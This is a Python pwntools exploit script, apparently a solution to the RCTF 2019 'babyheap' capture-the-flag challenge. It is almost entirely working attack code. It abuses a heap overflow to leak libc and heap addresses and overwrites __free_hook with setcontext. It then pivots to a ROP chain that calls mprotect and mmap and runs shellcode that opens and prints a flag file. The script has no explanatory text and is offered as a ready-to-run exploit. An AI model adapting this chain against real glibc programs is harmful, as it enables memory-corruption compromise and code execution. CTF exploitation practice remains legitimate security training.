from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_24_rctf_2019_babyheap')
p = process('./data/bin/heap23_24_rctf_2019_babyheap')
libc = elf.libc

uu64    = lambda data               :u64(data.ljust(8, b'\0'))

def add(size):
    p.recvuntil(b'Choice')
    p.sendline(b'1')
    p.recvuntil(b'Size:')
    p.sendline(str(size).encode())

def edit(idx,mes):
    p.recvuntil(b'Choice')
    p.sendline(b'2')
    p.recvuntil(b'Index:')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Content:')
    p.send(mes)

def dele(idx):
    p.recvuntil(b'Choice')
    p.sendline(b'3')
    p.recvuntil(b'Index:')
    p.sendline(str(idx).encode())

def show(idx):
    p.recvuntil(b'Choice')
    p.sendline(b'4')
    p.recvuntil(b'Index:')
    p.sendline(str(idx).encode())

def getRop(heap:int, libc_base:int, libc:ELF):
    a = '''
    mov esp,0x400100
    push 0x67616c66
    mov rdi,rsp
    '''
    shellcode = asm(a,arch='amd64',os='linux')    
    shellcode += asm(shellcraft.amd64.syscall('SYS_open','rdi','O_RDONLY', 0)+'mov rbx,rax',arch='amd64',os='linux')
    shellcode += asm(shellcraft.amd64.syscall('SYS_read','rbx',0x400200,0x20),arch='amd64',os='linux')
    shellcode += asm(shellcraft.amd64.syscall('SYS_write',1,0x400200,0x20),arch='amd64',os='linux')
    p_rdi=0x0000000000021102+libc_base
    p_rdx_rsi=0x00000000001150c9+libc_base
    p_rcx_rbx=0x00000000000ea69a+libc_base
    p_rsi = 0x00000000000202e8+libc_base
    mprotect=libc.symbols['mprotect']+libc_base
    setcontext = 0x47b75+libc_base
    success('setcontext= {}'.format(hex(setcontext)))
    mmap = libc.symbols['mmap']+libc_base
    edit(2,p64(setcontext))
    rop = p64(0)*5+p64(0xffffffff)+p64(0)#r8 r9
    rop+= p64(0)*13
    rop+= p64(heap+0x100)#mov rsp,[rdi+0xa0]
    rop+= p64(p_rdi)#push rcx;ret
    rop+= p64(heap)+p64(p_rdx_rsi)+p64(7)+p64(0x1000)+p64(mprotect)
    rop+= p64(p_rdi)+p64(0x400000)+p64(p_rdx_rsi)+p64(7)+p64(0x1000)+p64(p_rcx_rbx)+p64(0x22)+p64(0)+p64(mmap)
    rop+= p64(p_rcx_rbx)+p64(len(shellcode))+p64(0) + p64(p_rdi)+p64(0x400000) + p64(p_rsi)+p64(heap+0x1be)+p64(heap+0x1b0)
    rop+= asm('''
    rep movsd
    push 0x400000
    ret ''',arch='amd64',os='linux')+'\x00'
    rop+= shellcode
    return rop


add(0x18);add(0x508);add(0x18)#step.1
add(0x18);add(0x508);add(0x18);add(0x18)#step.2
edit(1,b'a'*0x4f0+p64(0x500));edit(4,b'a'*0x4f0+p64(0x500))#step.3
dele(1);edit(0,b'a'*0x18)#step.4
add(0x18);add(0x4d8)#step.5
dele(1);dele(2);add(0x18)#step.6
show(7);p.recv(1);leak = p.recv(6);libc_base=uu64(leak)-0x3c4b78#step.7
add(0x4e0);add(0x18);dele(3);dele(2)#step.8
show(7);p.recv(1);data = p.recv(6);heap = uu64(data)-0x550#step.9
add(0x4e0);add(0x18);dele(4)#step.10
edit(3,b'a'*0x18)#step.11
add(0x18);add(0x4d8)#step.12
dele(4);dele(5)#step.13
add(0x40);dele(2);add(0x4e8);dele(2)#step.14
free_hook = libc.symbols['__free_hook']+libc_base;fake_chunk = free_hook-0x10;payload = p64(0) + p64(fake_chunk);edit(7,payload)#step.15
payload2 = p64(0)*4 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk+8) +p64(0) + p64(fake_chunk-0x18-5);edit(9,payload2)#step.16
add(0x40)#step.17
rop = getRop(heap, libc_base, libc);edit(7,rop)#step.18
dele(7)#step.19
p.interactive()